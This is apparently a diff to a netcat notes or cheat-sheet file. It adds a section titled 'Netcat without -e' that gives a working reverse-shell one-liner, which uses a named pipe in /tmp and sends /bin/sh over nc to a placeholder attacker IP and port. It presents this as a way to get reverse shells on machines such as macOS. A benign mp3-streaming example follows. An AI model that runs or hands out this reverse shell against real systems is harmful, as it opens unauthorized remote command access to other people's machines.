@@ -1,5 +1,13 @@
 # netcat
 
+### Netcat without -e
+
+A lot of machines have netcat installed (example macosx) but it's not usable for reverse shells. However, with this it becomes useable.
+
+```sh
+mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc <ATTACKER IP> <PORT> 1>/tmp/backpipe
+```
+
 ### mp3 streaming
 ```sh
 nc -l -p 2000 < song.mp3
